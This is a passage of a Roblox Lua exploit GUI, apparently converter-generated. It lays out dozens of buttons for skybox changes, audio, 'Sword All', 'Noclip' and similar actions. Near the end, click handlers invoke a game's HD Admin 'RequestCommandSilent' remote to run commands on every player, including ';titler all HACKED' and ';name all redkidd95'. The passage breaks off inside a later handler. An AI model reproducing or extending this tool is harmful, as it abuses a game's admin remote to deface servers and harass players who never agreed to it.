			b_25.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_25.Position = UDim2.new(0.150605276, 0, 1.80147457, 0)
			b_25.Size = UDim2.new(0, 98, 0, 29)
			b_25.Font = Enum.Font.Roboto
			b_25.Text = "R15 ALL"
			b_25.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_25.TextScaled = true
			b_25.TextSize = 14.000
			b_25.TextWrapped = true
		
			b_26.Name = "b"
			b_26.Parent = r
			b_26.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_26.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_26.Position = UDim2.new(-0.0798358619, 0, 4.34739017, 0)
			b_26.Size = UDim2.new(0, 98, 0, 29)
			b_26.Font = Enum.Font.Roboto
			b_26.Text = "Message"
			b_26.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_26.TextScaled = true
			b_26.TextSize = 14.000
			b_26.TextWrapped = true
		
			b_27.Name = "b"
			b_27.Parent = r
			b_27.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_27.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_27.Position = UDim2.new(0.845344067, 0, 4.31325626, 0)
			b_27.Size = UDim2.new(0, 98, 0, 29)
			b_27.Font = Enum.Font.Roboto
			b_27.Text = "Sword All"
			b_27.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_27.TextScaled = true
			b_27.TextSize = 14.000
			b_27.TextWrapped = true
		
			b_28.Name = "b"
			b_28.Parent = r
			b_28.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_28.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_28.Position = UDim2.new(0.375460625, 0, 7.03848124, 0)
			b_28.Size = UDim2.new(0, 98, 0, 29)
			b_28.Font = Enum.Font.Roboto
			b_28.Text = "Dog all"
			b_28.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_28.TextScaled = true
			b_28.TextSize = 14.000
			b_28.TextWrapped = true
		
			b_29.Name = "b"
			b_29.Parent = r
			b_29.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_29.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_29.Position = UDim2.new(-0.0798566118, 0, 3.52816892, 0)
			b_29.Size = UDim2.new(0, 98, 0, 29)
			b_29.Font = Enum.Font.Roboto
			b_29.Text = "Noclip"
			b_29.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_29.TextScaled = true
			b_29.TextSize = 14.000
			b_29.TextWrapped = true
		
			b_30.Name = "b"
			b_30.Parent = r
			b_30.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_30.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_30.Position = UDim2.new(-0.0814167708, 0, 2.67481375, 0)
			b_30.Size = UDim2.new(0, 98, 0, 29)
			b_30.Font = Enum.Font.Roboto
			b_30.Text = "Trippy Skybox"
			b_30.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_30.TextScaled = true
			b_30.TextSize = 14.000
			b_30.TextWrapped = true
		
			b_31.Name = "b"
			b_31.Parent = r
			b_31.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_31.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_31.Position = UDim2.new(-0.0819819272, 0, 6.12113667, 0)
			b_31.Size = UDim2.new(0, 98, 0, 29)
			b_31.Font = Enum.Font.Roboto
			b_31.Text = "Poo poo test skybox"
			b_31.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_31.TextScaled = true
			b_31.TextSize = 14.000
			b_31.TextWrapped = true
		
			b_32.Name = "b"
			b_32.Parent = r
			b_32.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_32.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_32.Position = UDim2.new(0.151014566, 0, 6.12113667, 0)
			b_32.Size = UDim2.new(0, 98, 0, 29)
			b_32.Font = Enum.Font.Roboto
			b_32.Text = "zero two"
			b_32.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_32.TextScaled = true
			b_32.TextSize = 14.000
			b_32.TextWrapped = true
		
			b_33.Name = "b"
			b_33.Parent = r
			b_33.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_33.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_33.Position = UDim2.new(0.381680876, 0, 6.12113667, 0)
			b_33.Size = UDim2.new(0, 98, 0, 29)
			b_33.Font = Enum.Font.Roboto
			b_33.Text = "RETURNS SKYBOX"
			b_33.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_33.TextScaled = true
			b_33.TextSize = 14.000
			b_33.TextWrapped = true
		
			jeje_3.Name = "jeje"
			jeje_3.Parent = r
			jeje_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			jeje_3.BackgroundTransparency = 1.000
			jeje_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
			jeje_3.BorderSizePixel = 0
			jeje_3.Position = UDim2.new(0.0298210736, 0, 9.72000027, 0)
			jeje_3.Size = UDim2.new(0, 222, 0, 39)
			jeje_3.Image = "rbxassetid://121329478289353"
		
			b_34.Name = "b"
			b_34.Parent = r
			b_34.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_34.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_34.Position = UDim2.new(0.149256796, 0, 8.80008411, 0)
			b_34.Size = UDim2.new(0, 98, 0, 29)
			b_34.Font = Enum.Font.Roboto
			b_34.Text = "Sparkle f3x"
			b_34.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_34.TextScaled = true
			b_34.TextSize = 14.000
			b_34.TextWrapped = true
		
			b_35.Name = "b"
			b_35.Parent = r
			b_35.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_35.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_35.Position = UDim2.new(0.845916331, 0, 6.10008526, 0)
			b_35.Size = UDim2.new(0, 98, 0, 29)
			b_35.Font = Enum.Font.Roboto
			b_35.Text = "Smoke f3x"
			b_35.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_35.TextScaled = true
			b_35.TextSize = 14.000
			b_35.TextWrapped = true
		
			b_36.Name = "b"
			b_36.Parent = r
			b_36.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_36.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_36.Position = UDim2.new(-0.079522863, 0, 18.4400005, 0)
			b_36.Size = UDim2.new(0, 98, 0, 29)
			b_36.Font = Enum.Font.Roboto
			b_36.Text = "EVERY END GD"
			b_36.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_36.TextScaled = true
			b_36.TextSize = 14.000
			b_36.TextWrapped = true
		
			b_37.Name = "b"
			b_37.Parent = r
			b_37.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_37.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_37.Position = UDim2.new(-0.0852743611, 0, 8.81199551, 0)
			b_37.Size = UDim2.new(0, 98, 0, 29)
			b_37.Font = Enum.Font.Roboto
			b_37.Text = "Skybox 2"
			b_37.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_37.TextScaled = true
			b_37.TextSize = 14.000
			b_37.TextWrapped = true
		
			e_2.Name = "e"
			e_2.Parent = r
			e_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_2.Position = UDim2.new(0.15506959, 0, 10.7799997, 0)
			e_2.Size = UDim2.new(0, 97, 0, 28)
			e_2.Font = Enum.Font.Roboto
			e_2.Text = "bad apple p1"
			e_2.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_2.TextScaled = true
			e_2.TextSize = 14.000
			e_2.TextWrapped = true
		
			e_3.Name = "e"
			e_3.Parent = r
			e_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_3.Position = UDim2.new(-0.0775347948, 0, 10.7799997, 0)
			e_3.Size = UDim2.new(0, 97, 0, 28)
			e_3.Font = Enum.Font.Roboto
			e_3.Text = "bad apple p2"
			e_3.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_3.TextScaled = true
			e_3.TextSize = 14.000
			e_3.TextWrapped = true
		
			e_4.Name = "e"
			e_4.Parent = r
			e_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_4.Position = UDim2.new(0.153980777, 0, 11.6013699, 0)
			e_4.Size = UDim2.new(0, 97, 0, 28)
			e_4.Font = Enum.Font.Roboto
			e_4.Text = "teto territory"
			e_4.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_4.TextScaled = true
			e_4.TextSize = 14.000
			e_4.TextWrapped = true
		
			e_5.Name = "e"
			e_5.Parent = r
			e_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_5.Position = UDim2.new(0.382859588, 0, 14.9794922, 0)
			e_5.Size = UDim2.new(0, 97, 0, 28)
			e_5.Font = Enum.Font.Roboto
			e_5.Text = "blood pop p1"
			e_5.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_5.TextScaled = true
			e_5.TextSize = 14.000
			e_5.TextWrapped = true
		
			e_6.Name = "e"
			e_6.Parent = r
			e_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_6.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_6.Position = UDim2.new(-0.0775347948, 0, 20.2800007, 0)
			e_6.Size = UDim2.new(0, 97, 0, 28)
			e_6.Font = Enum.Font.Roboto
			e_6.Text = "yea"
			e_6.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_6.TextScaled = true
			e_6.TextSize = 14.000
			e_6.TextWrapped = true
		
			e_7.Name = "e"
			e_7.Parent = r
			e_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_7.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_7.Position = UDim2.new(-0.0811634138, 0, 17.5773907, 0)
			e_7.Size = UDim2.new(0, 97, 0, 28)
			e_7.Font = Enum.Font.Roboto
			e_7.Text = "Kerosene"
			e_7.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_7.TextScaled = true
			e_7.TextSize = 14.000
			e_7.TextWrapped = true
		
			e_8.Name = "e"
			e_8.Parent = r
			e_8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_8.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_8.Position = UDim2.new(0.381102055, 0, 15.8566923, 0)
			e_8.Size = UDim2.new(0, 97, 0, 28)
			e_8.Font = Enum.Font.Roboto
			e_8.Text = "jumpztyle"
			e_8.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_8.TextScaled = true
			e_8.TextSize = 14.000
			e_8.TextWrapped = true
		
			e_9.Name = "e"
			e_9.Parent = r
			e_9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_9.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_9.Position = UDim2.new(0.15506959, 0, 20.2800007, 0)
			e_9.Size = UDim2.new(0, 97, 0, 28)
			e_9.Font = Enum.Font.Roboto
			e_9.Text = "yaai"
			e_9.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_9.TextScaled = true
			e_9.TextSize = 14.000
			e_9.TextWrapped = true
		
			e_10.Name = "e"
			e_10.Parent = r
			e_10.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_10.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_10.Position = UDim2.new(0.150083631, 0, 17.557394, 0)
			e_10.Size = UDim2.new(0, 97, 0, 28)
			e_10.Font = Enum.Font.Roboto
			e_10.Text = "audio big collab"
			e_10.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_10.TextScaled = true
			e_10.TextSize = 14.000
			e_10.TextWrapped = true
		
			e_11.Name = "e"
			e_11.Parent = r
			e_11.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_11.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_11.Position = UDim2.new(0.382249713, 0, 12.3813696, 0)
			e_11.Size = UDim2.new(0, 97, 0, 28)
			e_11.Font = Enum.Font.Roboto
			e_11.Text = "AH?AH! (not my audio)"
			e_11.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_11.TextScaled = true
			e_11.TextSize = 14.000
			e_11.TextWrapped = true
		
			e_12.Name = "e"
			e_12.Parent = r
			e_12.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_12.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_12.Position = UDim2.new(0.385685891, 0, 20.2800007, 0)
			e_12.Size = UDim2.new(0, 97, 0, 28)
			e_12.Font = Enum.Font.Roboto
			e_12.Text = "sus"
			e_12.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_12.TextScaled = true
			e_12.TextSize = 14.000
			e_12.TextWrapped = true
		
			e_13.Name = "e"
			e_13.Parent = r
			e_13.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_13.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_13.Position = UDim2.new(-0.0811634138, 0, 15.8914824, 0)
			e_13.Size = UDim2.new(0, 97, 0, 28)
			e_13.Font = Enum.Font.Roboto
			e_13.Text = "Memories idk"
			e_13.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_13.TextScaled = true
			e_13.TextSize = 14.000
			e_13.TextWrapped = true
		
			e_14.Name = "e"
			e_14.Parent = r
			e_14.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_14.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_14.Position = UDim2.new(-0.0805973485, 0, 11.6114807, 0)
			e_14.Size = UDim2.new(0, 97, 0, 28)
			e_14.Font = Enum.Font.Roboto
			e_14.Text = "i got a glock in my rarri"
			e_14.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_14.TextScaled = true
			e_14.TextSize = 14.000
			e_14.TextWrapped = true
		
			e_15.Name = "e"
			e_15.Parent = r
			e_15.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_15.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_15.Position = UDim2.new(0.150270492, 0, 15.8914824, 0)
			e_15.Size = UDim2.new(0, 97, 0, 28)
			e_15.Font = Enum.Font.Roboto
			e_15.Text = "body rollz"
			e_15.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_15.TextScaled = true
			e_15.TextSize = 14.000
			e_15.TextWrapped = true
		
			e_16.Name = "e"
			e_16.Parent = r
			e_16.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_16.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_16.Position = UDim2.new(0.150083631, 0, 16.751482, 0)
			e_16.Size = UDim2.new(0, 97, 0, 28)
			e_16.Font = Enum.Font.Roboto
			e_16.Text = "cooking by the book "
			e_16.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_16.TextScaled = true
			e_16.TextSize = 14.000
			e_16.TextWrapped = true
		
			e_17.Name = "e"
			e_17.Parent = r
			e_17.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_17.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_17.Position = UDim2.new(0.151052311, 0, 14.9914818, 0)
			e_17.Size = UDim2.new(0, 97, 0, 28)
			e_17.Font = Enum.Font.Roboto
			e_17.Text = "w"
			e_17.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_17.TextScaled = true
			e_17.TextSize = 14.000
			e_17.TextWrapped = true
		
			e_18.Name = "e"
			e_18.Parent = r
			e_18.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_18.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_18.Position = UDim2.new(-0.0813398436, 0, 16.7413692, 0)
			e_18.Size = UDim2.new(0, 97, 0, 28)
			e_18.Font = Enum.Font.Roboto
			e_18.Text = "pls stop"
			e_18.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_18.TextScaled = true
			e_18.TextSize = 14.000
			e_18.TextWrapped = true
		
			e_19.Name = "e"
			e_19.Parent = r
			e_19.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_19.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_19.Position = UDim2.new(0.383697808, 0, 19.3799992, 0)
			e_19.Size = UDim2.new(0, 97, 0, 28)
			e_19.Font = Enum.Font.Roboto
			e_19.Text = "bobby2pistolz"
			e_19.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_19.TextScaled = true
			e_19.TextSize = 14.000
			e_19.TextWrapped = true
		
			e_20.Name = "e"
			e_20.Parent = r
			e_20.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_20.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_20.Position = UDim2.new(-0.0811634138, 0, 14.9940586, 0)
			e_20.Size = UDim2.new(0, 97, 0, 28)
			e_20.Font = Enum.Font.Roboto
			e_20.Text = "creeepers"
			e_20.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_20.TextScaled = true
			e_20.TextSize = 14.000
			e_20.TextWrapped = true
		
			e_21.Name = "e"
			e_21.Parent = r
			e_21.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_21.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_21.Position = UDim2.new(0.15506959, 0, 19.3799992, 0)
			e_21.Size = UDim2.new(0, 97, 0, 28)
			e_21.Font = Enum.Font.Roboto
			e_21.Text = "tripaloski"
			e_21.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_21.TextScaled = true
			e_21.TextSize = 14.000
			e_21.TextWrapped = true
		
			e_22.Name = "e"
			e_22.Parent = r
			e_22.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_22.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_22.Position = UDim2.new(0.153159291, 0, 14.0740585, 0)
			e_22.Size = UDim2.new(0, 97, 0, 28)
			e_22.Font = Enum.Font.Roboto
			e_22.Text = "lotsa spaghetti remix 2"
			e_22.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_22.TextScaled = true
			e_22.TextSize = 14.000
			e_22.TextWrapped = true
		
			e_23.Name = "e"
			e_23.Parent = r
			e_23.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_23.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_23.Position = UDim2.new(-0.0799903944, 0, 14.0740585, 0)
			e_23.Size = UDim2.new(0, 97, 0, 28)
			e_23.Font = Enum.Font.Roboto
			e_23.Text = "memorycardz yabujin"
			e_23.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_23.TextScaled = true
			e_23.TextSize = 14.000
			e_23.TextWrapped = true
		
			e_24.Name = "e"
			e_24.Parent = r
			e_24.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_24.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_24.Position = UDim2.new(0.383430749, 0, 14.0740585, 0)
			e_24.Size = UDim2.new(0, 97, 0, 28)
			e_24.Font = Enum.Font.Roboto
			e_24.Text = "saxophone guy"
			e_24.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_24.TextScaled = true
			e_24.TextSize = 14.000
			e_24.TextWrapped = true
		
			e_25.Name = "e"
			e_25.Parent = r
			e_25.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_25.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_25.Position = UDim2.new(-0.0775347948, 0, 19.3799992, 0)
			e_25.Size = UDim2.new(0, 97, 0, 28)
			e_25.Font = Enum.Font.Roboto
			e_25.Text = "sesame trap"
			e_25.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_25.TextScaled = true
			e_25.TextSize = 14.000
			e_25.TextWrapped = true
		
			e_26.Name = "e"
			e_26.Parent = r
			e_26.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_26.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_26.Position = UDim2.new(0.154684201, 0, 12.3839464, 0)
			e_26.Size = UDim2.new(0, 97, 0, 28)
			e_26.Font = Enum.Font.Roboto
			e_26.Text = "xxd"
			e_26.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_26.TextScaled = true
			e_26.TextSize = 14.000
			e_26.TextWrapped = true
		
			e_27.Name = "e"
			e_27.Parent = r
			e_27.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_27.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_27.Position = UDim2.new(0.385685891, 0, 18.4400005, 0)
			e_27.Size = UDim2.new(0, 97, 0, 28)
			e_27.Font = Enum.Font.Roboto
			e_27.Text = "mom is kinda homeless 2"
			e_27.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_27.TextScaled = true
			e_27.TextSize = 14.000
			e_27.TextWrapped = true
		
			e_28.Name = "e"
			e_28.Parent = r
			e_28.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_28.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_28.Position = UDim2.new(0.384706289, 0, 13.1432457, 0)
			e_28.Size = UDim2.new(0, 97, 0, 28)
			e_28.Font = Enum.Font.Roboto
			e_28.Text = "idfk"
			e_28.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_28.TextScaled = true
			e_28.TextSize = 14.000
			e_28.TextWrapped = true
		
			e_29.Name = "e"
			e_29.Parent = r
			e_29.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_29.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_29.Position = UDim2.new(0.153941348, 0, 13.1439466, 0)
			e_29.Size = UDim2.new(0, 97, 0, 28)
			e_29.Font = Enum.Font.Roboto
			e_29.Text = "Sparta!"
			e_29.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_29.TextScaled = true
			e_29.TextSize = 14.000
			e_29.TextWrapped = true
		
			e_30.Name = "e"
			e_30.Parent = r
			e_30.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_30.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_30.Position = UDim2.new(-0.0784079731, 0, 12.3862209, 0)
			e_30.Size = UDim2.new(0, 97, 0, 28)
			e_30.Font = Enum.Font.Roboto
			e_30.Text = "Subway 6ists"
			e_30.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_30.TextScaled = true
			e_30.TextSize = 14.000
			e_30.TextWrapped = true
		
			e_31.Name = "e"
			e_31.Parent = r
			e_31.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_31.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_31.Position = UDim2.new(-0.0778661743, 0, 13.1510324, 0)
			e_31.Size = UDim2.new(0, 97, 0, 28)
			e_31.Font = Enum.Font.Roboto
			e_31.Text = "hoodtrap"
			e_31.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_31.TextScaled = true
			e_31.TextSize = 14.000
			e_31.TextWrapped = true
		
			e_32.Name = "e"
			e_32.Parent = r
			e_32.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_32.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_32.Position = UDim2.new(0, 193, 0, 877)
			e_32.Size = UDim2.new(0, 97, 0, 28)
			e_32.Font = Enum.Font.Roboto
			e_32.Text = "CARAMELLDANSEN x i dontlike"
			e_32.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_32.TextScaled = true
			e_32.TextSize = 14.000
			e_32.TextWrapped = true
		
			e_33.Name = "e"
			e_33.Parent = r
			e_33.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_33.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_33.Position = UDim2.new(0, 189, 0, 580)
			e_33.Size = UDim2.new(0, 97, 0, 28)
			e_33.Font = Enum.Font.Roboto
			e_33.Text = "russian 2"
			e_33.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_33.TextScaled = true
			e_33.TextSize = 14.000
			e_33.TextWrapped = true
		
			e_34.Name = "e"
			e_34.Parent = r
			e_34.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_34.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_34.Position = UDim2.new(0.153081506, 0, 18.4400005, 0)
			e_34.Size = UDim2.new(0, 97, 0, 28)
			e_34.Font = Enum.Font.Roboto
			e_34.Text = "russian "
			e_34.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_34.TextScaled = true
			e_34.TextSize = 14.000
			e_34.TextWrapped = true
		
			e_35.Name = "e"
			e_35.Parent = r
			e_35.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e_35.BorderColor3 = Color3.fromRGB(255, 0, 0)
			e_35.Position = UDim2.new(0, 193, 0, 838)
			e_35.Size = UDim2.new(0, 97, 0, 28)
			e_35.Font = Enum.Font.Roboto
			e_35.Text = "russian c00lkidd"
			e_35.TextColor3 = Color3.fromRGB(255, 255, 255)
			e_35.TextScaled = true
			e_35.TextSize = 14.000
			e_35.TextWrapped = true
		
			b_38.Name = "b"
			b_38.Parent = r
			b_38.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_38.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_38.Position = UDim2.new(0.381709754, 0, 10.8000002, 0)
			b_38.Size = UDim2.new(0, 98, 0, 27)
			b_38.Font = Enum.Font.Roboto
			b_38.Text = "THEME"
			b_38.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_38.TextScaled = true
			b_38.TextSize = 14.000
			b_38.TextWrapped = true
		
			b_39.Name = "b"
			b_39.Parent = ye
			b_39.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_39.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_39.Position = UDim2.new(-0.297820836, 0, 0.0166666675, 0)
			b_39.Rotation = -12.000
			b_39.Size = UDim2.new(0, 98, 0, 29)
			b_39.Font = Enum.Font.Roboto
			b_39.Text = "secret sky"
			b_39.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_39.TextScaled = true
			b_39.TextSize = 14.000
			b_39.TextWrapped = true
		
			-- Scripts:
		
			local function LYFGWFF_fake_script() -- ye.d 
				local script = Instance.new('LocalScript', ye)
		
				local UserInputService = game:GetService("UserInputService")
				local runService = (game:GetService("RunService"));
		
				local gui = script.Parent
		
				local dragging
				local dragInput
				local dragStart
				local startPos
		
				function Lerp(a, b, m)
					return a + (b - a) * m
				end;
		
				local lastMousePos
				local lastGoalPos
				local DRAG_SPEED = (8); -- // The speed of the UI darg.
				function Update(dt)
					if not (startPos) then return end;
					if not (dragging) and (lastGoalPos) then
						gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
						return 
					end;
		
					local delta = (lastMousePos - UserInputService:GetMouseLocation())
					local xGoal = (startPos.X.Offset - delta.X);
					local yGoal = (startPos.Y.Offset - delta.Y);
					lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
					gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
				end;
		
				gui.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
						dragging = true
						dragStart = input.Position
						startPos = gui.Position
						lastMousePos = UserInputService:GetMouseLocation()
		
						input.Changed:Connect(function()
							if input.UserInputState == Enum.UserInputState.End then
								dragging = false
							end
						end)
					end
				end)
		
				gui.InputChanged:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
						dragInput = input
					end
				end)
		
				runService.Heartbeat:Connect(Update)
			end
			coroutine.wrap(LYFGWFF_fake_script)()
			local function RYOPYUB_fake_script() -- jeje.LocalScript 
				local script = Instance.new('LocalScript', jeje)
		
				while wait() do
					for i = 0,255,5 do
						script.Parent.ImageColor3 = Color3.fromRGB(255,i,0) -- change backgroundcolor3 to textcolor3 to make text color rainbow
						wait(0.01)
					end
					for i = 255,0,-5 do
						script.Parent.ImageColor3 = Color3.fromRGB(i,255,0)
						wait(0.01)
					end
					for i = 0,255,5 do
						script.Parent.ImageColor3 = Color3.fromRGB(0,255,i)
						wait(0.01)
					end
					for i = 255,0,-5 do
						script.Parent.ImageColor3 = Color3.fromRGB(0,i,255)
						wait(0.01)
					end
					for i = 0,255,5 do
						script.Parent.ImageColor3 = Color3.fromRGB(i,0,255)
						wait(0.01)
					end
					for i = 255,0,-5 do
						script.Parent.ImageColor3 = Color3.fromRGB(255,0,i)
						wait(0.01)
					end
				end
			end
			coroutine.wrap(RYOPYUB_fake_script)()
			local function YHESLIA_fake_script() -- b.LocalScript 
				local script = Instance.new('LocalScript', b)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";titler all HACKED")
				end)
			end
			coroutine.wrap(YHESLIA_fake_script)()
			local function TEVLYO_fake_script() -- b_2.LocalScript 
				local script = Instance.new('LocalScript', b_2)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";name all redkidd95")
				end)
			end
			coroutine.wrap(TEVLYO_fake_script)()
			local function URBIN_fake_script() -- b_3.LocalScript 
				local script = Instance.new('LocalScript', b_3)
		
				local button = script.Parent
		
